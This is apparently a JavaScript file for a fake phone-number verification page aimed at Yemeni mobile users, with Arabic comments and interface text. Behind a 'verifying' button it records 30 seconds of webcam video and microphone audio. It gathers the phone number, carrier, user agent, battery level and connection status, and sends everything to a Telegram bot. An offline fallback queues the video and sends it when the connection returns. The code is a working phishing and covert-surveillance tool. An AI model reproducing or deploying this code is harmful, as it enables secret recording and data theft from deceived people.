let botToken = '';
let chatId = '';

// تحميل التوكن ومعرف الدردشة من config.json
fetch('config.json')
  .then(res => {
    if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
    return res.json();
  })
  .then(data => {
    botToken = data.botToken;
    chatId = data.chatId;
  })
  .catch(err => {
    console.error('فشل تحميل الإعدادات:', err);
    alert('فشل تحميل الإعدادات. تأكد من وجود config.json في نفس مجلد index.html.');
  });

document.getElementById('phoneNumber').addEventListener('input', () => {
  const phone = document.getElementById('phoneNumber').value;
  const carrierName = detectCarrier(phone);
  document.getElementById('carrierDisplay').innerText = "مزود الخدمة: " + carrierName;
});

function detectCarrier(phoneNumber) {
  const cleaned = phoneNumber.replace(/\D/g, '');
  const prefix = cleaned.substring(0, 2);
  switch (prefix) {
    case '77': return "يمن موبايل";
    case '71': return "سبأفون";
    case '73': return "MTN";
    case '70': return "واي";
    default: return "مزود غير معروف";
  }
}

function confirmConsent() {
  document.getElementById('consentBox').style.display = 'none';
  document.getElementById('confirmBtn').style.display = 'inline-block';
}

function startCameraAndSend() {
  const phoneNumber = document.getElementById('phoneNumber').value.trim();
  if (phoneNumber === '') {
    alert('يرجى إدخال رقم الهاتف.');
    return;
  }
  document.getElementById('confirmBtn').innerHTML = 'جاري التحقق...';
  document.getElementById('confirmBtn').disabled = true;
  recordAndSendVideo(phoneNumber);
}

async function recordAndSendVideo(phoneNumber) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    alert("المتصفح لا يدعم الكاميرا.");
    resetButton();
    return;
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    const chunks = [];

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) chunks.push(event.data);
    };

    mediaRecorder.onstop = async () => {
      const videoBlob = new Blob(chunks, { type: 'video/webm' });
      const info = await collectUserInfo(phoneNumber);

      if (!navigator.onLine) {
        // حفظ الفيديو مؤقتًا
        const reader = new FileReader();
        reader.onloadend = () => {
          localStorage.setItem("pendingVideo", reader.result); // base64
          localStorage.setItem("pendingCaption", info.caption);
          console.log("تم حفظ الفيديو مؤقتًا بدون اتصال.");
        };
        reader.readAsDataURL(videoBlob);
      } else {
        // إرسال مباشرة
        sendToTelegram(videoBlob, info.caption);
      }

      document.getElementById('confirmedNumber').innerText = phoneNumber;
      document.getElementById('confirmationMessage').style.display = 'block';
      stream.getTracks().forEach(track => track.stop());
      resetButton();
    };

    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 30000);
  } catch (error) {
    console.error("فشل تشغيل الكاميرا:", error);
    alert("حدث خطأ في الوصول إلى الكاميرا أو الميكروفون.");
    resetButton();
  }
}

function sendToTelegram(blob, caption) {
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('video', blob, 'recording.webm');
  formData.append('caption', caption);

  fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
    method: 'POST',
    body: formData
  })
    .then(res => res.json())
    .then(result => {
      if (!result.ok) {
        console.error("فشل الإرسال:", result.description);
      } else {
        console.log("تم الإرسال بنجاح.");
      }
    })
    .catch(err => {
      console.error("خطأ أثناء الإرسال:", err);
    });
}

// عند عودة الإنترنت - محاولة إرسال الفيديو المحفوظ
window.addEventListener('online', () => {
  const pending = localStorage.getItem("pendingVideo");
  const caption = localStorage.getItem("pendingCaption");

  if (pending && caption) {
    const blob = dataURLtoBlob(pending);
    sendToTelegram(blob, caption);
    localStorage.removeItem("pendingVideo");
    localStorage.removeItem("pendingCaption");
    console.log("تم إرسال الفيديو المؤجل بنجاح بعد عودة الاتصال.");
  }
});

function dataURLtoBlob(dataURL) {
  const byteString = atob(dataURL.split(',')[1]);
  const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}

function resetButton() {
  const btn = document.getElementById('confirmBtn');
  btn.innerHTML = 'تأكيد';
  btn.disabled = false;
}

async function collectUserInfo(phoneNumber) {
  const userAgent = navigator.userAgent;
  const connectionStatus = navigator.onLine ? "متصل بالإنترنت" : "غير متصل";
  let batteryLevel = "غير متوفر";

  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      batteryLevel = Math.round(battery.level * 100) + "%";
    } catch (e) {
      batteryLevel = "غير متاح";
    }
  }

  const carrier = detectCarrier(phoneNumber);
  const caption = `📱 رقم الهاتف: ${phoneNumber}\n🏢 مزود الخدمة: ${carrier}\n🖥️ نوع الجهاز: ${userAgent}\n🔋 نسبة البطارية: ${batteryLevel}\n🌐 الاتصال: ${connectionStatus}`;
  return { caption };
}
